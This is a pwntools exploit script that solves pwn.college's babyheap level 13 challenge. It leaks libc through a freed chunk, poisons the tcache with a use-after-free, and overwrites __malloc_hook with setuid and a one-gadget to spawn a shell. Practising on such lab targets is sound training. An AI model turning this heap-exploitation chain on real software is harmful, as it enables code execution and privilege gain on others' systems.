from pwn import *
from pwn import p64
from time import sleep
context.binary=e=ELF("./babyheap_level13.0")
libc=e.libc
gs="""
set follow-fork-mode parent
"""
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyheap_level13.0")
if args.DEBUG:
    context.log_level='debug'
def malloc(idx: int,size: int):
    p.sendlineafter(b"[*] Function",b"malloc")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size: ",str(size).encode())
    sleep(1)
def free(idx: int):
    p.sendlineafter(b"[*] Function",b"free")
    p.sendlineafter(b"Index: ",str(idx).encode())
    sleep(1)
def puts(idx: int):
    p.sendlineafter(b"[*] Function",b"puts")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.recvuntil(b"Data: ")
    sleep(1)
    return p.recvuntil(b"\n").rstrip()
def scanf(idx: int,buffer: bytes):
    p.sendlineafter(b"[*] Function",b"scanf")
    p.sendlineafter(b"Index: ",str(idx).encode())
    #p.sendlineafter(f"allocations[{idx}])\n".encode(),buffer)
    p.sendline(buffer)
    sleep(1)
malloc(0,0x600)
malloc(1,0x68)
free(0)
leaked=puts(0)[::-1]
log.info("0x{}".format(leaked.hex()))
libc.address=int(leaked.hex(),16)-0x1ecbe0
free(1)
scanf(1,b"\x00"*0x10)
free(1)
scanf(1,p64(libc.sym.__malloc_hook-35)+p64(0))
malloc(2,0x68)
malloc(2,0x68)
if args.REMOTE:
    scanf(2,b"A"*35+p64(libc.sym.setuid))
    malloc(3,0)
scanf(2,b"A"*35+p64(libc.address+0xe3b01))
sleep(1)
malloc(3,0)
p.interactive()